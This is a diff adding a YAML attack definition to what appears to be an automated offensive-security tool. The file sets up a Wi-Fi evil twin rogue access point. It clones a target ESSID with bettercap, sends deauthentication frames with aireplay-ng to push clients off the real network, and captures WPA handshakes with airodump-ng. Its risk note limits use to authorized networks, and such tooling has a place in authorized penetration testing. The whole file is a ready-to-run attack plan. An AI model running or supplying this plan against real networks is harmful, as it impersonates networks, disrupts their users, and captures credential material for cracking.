@@ -1,0 +1,64 @@
+# Mech-Unit attack intent — Evil Twin rogue AP.
+# Clones the target AP's identity (ESSID) to capture association attempts
+# and handshake material from its clients. Packaging of the evil-twin
+# methodology from workflows/templates/evil_twin_chain.yaml.
+id: wifi_evil_twin
+name: Evil Twin Rogue AP
+category: wireless
+operator_label: "Stand up an evil twin of the target AP"
+operator_description: >
+  Clones the target AP's identity to capture association attempts and
+  handshake material, then deauthenticates its clients so they wander to
+  the twin. Highest-value when handshake capture alone is failing.
+outcome: "Handshake material from target clients + association telemetry"
+grants: [wifi.handshake_file]
+time_to_impact: tens-of-minutes
+noise: high
+risk_notes: >
+  Actively impersonates the target network and disrupts its clients.
+  Strictly for networks you own or are authorized to test.
+
+preconditions:
+  - probe: wireless_adapter_monitor_capable
+  - probe: tools_present
+    with: [airodump-ng, aireplay-ng]
+
+plan:
+  - step: monitor_up
+    tool: monitor_mode_enable
+    args:
+      interface: "{{ resolver.interface.monitor }}"
+
+  - step: clone_ap
+    tool: bettercap_mitm
+    args:
+      target: "{{ target.essid }}"
+      module: wifi
+    max_wait: 60
+    on_fail: warn
+
+  - step: deauth_clients
+    tool: aireplay_attack
+    args:
+      interface: "{{ resolver.interface.monitor }}"
+      bssid: "{{ target.bssid }}"
+      attack: "0"
+    max_wait: 30
+    on_fail: warn
+
+  - step: capture_handshake
+    tool: airodump_capture
+    args:
+      interface: "{{ resolver.interface.monitor }}"
+      bssid: "{{ target.bssid }}"
+      channel: "{{ resolver.channel.or_hop }}"
+      capture_file: "{{ resolver.artifacts.capture_prefix }}"
+    max_wait: 300
+    gate:
+      output: "WPA handshake|handshake"
+    on_fail: warn
+
+artifacts:
+  capture: "{{ plan_dir }}/capture-01.cap"
+
+llm_required: false
